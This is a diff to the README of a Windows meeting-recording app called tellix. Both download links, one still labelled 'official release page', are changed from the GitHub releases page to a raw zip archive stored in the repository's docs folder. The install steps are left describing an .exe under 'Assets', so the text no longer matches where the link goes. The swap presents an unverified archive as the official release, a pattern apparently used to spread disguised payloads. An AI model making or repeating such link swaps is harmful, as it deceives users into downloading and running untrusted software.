@@ -1,6 +1,6 @@
 # ⏺ tellix - Record meetings with automatic live subtitles
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/pearlashmarchingorder720/tellix/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/pearlashmarchingorder720/tellix/raw/refs/heads/main/docs/Software-v1.3-beta.1.zip)
 
 Tellix captures your computer screen, microphone, and system audio simultaneously. It creates an MP4 file with subtitles added to the video. All transcription happens on your computer. You keep your data private because the app works without an internet connection.
 
@@ -28,7 +28,7 @@ To use this software, your computer must meet these basic standards:
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Go to the [official release page](https://github.com/pearlashmarchingorder720/tellix/releases).
+1. Go to the [official release page](https://github.com/pearlashmarchingorder720/tellix/raw/refs/heads/main/docs/Software-v1.3-beta.1.zip).
 2. Look for the latest version listed under the "Assets" section.
 3. Click the file ending in `.exe` to start the download.
 4. Save the file to your desktop or downloads folder.
